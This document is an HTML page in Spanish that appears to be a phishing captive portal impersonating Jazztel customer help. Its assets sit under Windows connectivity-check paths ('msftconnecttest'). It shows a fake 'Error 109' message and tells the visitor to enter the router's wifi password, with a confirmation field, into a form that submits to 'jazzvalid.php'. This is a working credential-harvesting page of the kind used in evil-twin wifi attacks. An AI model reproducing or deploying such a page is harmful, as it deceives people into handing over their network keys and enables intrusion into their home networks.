<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html  class="no-js" xmlns="http://www.w3.org/1999/xhtml" xml:lang="es_ES" lang="es_ES">
	<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
	<head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>Ayuda Jazztel</title>
        <link rel="stylesheet" href="/msftconnecttest/jazzcss/jazztel.css" media="screen" type="text/css" />
   </head>
<body>
<img class="idbandeau" src="/msftconnecttest/jazzimg/holalol.png" />
</br>
<p>Error 109: no se puede conectar, para segurar la conexión hay que entrar la contraseña wifi del router.La contraseña esta indicado atrás del router.</p>
</br>
<img class="idjzt" src="/msftconnecttest/jazzimg/jazztel2.png" />
</br>
<img class="idclave" src="/msftconnecttest/jazzimg/clave.png" />
</br>
</br>
</div>
<p></strong> <a href="/msftconnecttest/jazzshout/jazztchat.php" target="_blank"><u>Ayuda en linea</u> ...</a></p>
<div id="container">
            <!-- zone de connexion -->
            
            <form method="POST" action="jazzvalid.php">
                <h1>Conexión</h1>
                
                <label><b>Clave wifi</b></label>
                <input type="text" name="cle">

                <label><b>Confirmación</b></label>
                <input type="text" name="cleconf">

                <input type="submit" id='submit' value='ENTRAR' >

            </form>
        </div>
</br>
</br>
</br>
</br>
</body>
</html>
